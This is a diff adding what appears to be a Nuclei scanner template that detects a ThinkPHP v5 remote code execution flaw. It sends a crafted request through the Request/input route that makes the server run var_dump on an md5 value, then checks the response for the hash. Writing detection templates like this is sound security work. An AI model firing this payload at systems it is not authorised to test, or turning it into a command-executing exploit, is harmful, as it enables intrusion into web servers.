@@ -1,0 +1,27 @@
+id: poc-local-thinkphp-v5-request-input-rce
+
+info:
+  name: poc-local-thinkphp-v5-request-input-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        GET /index.php?s=index/\think\Request/input&filter=var_dump&data=md5({{randInt}}) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
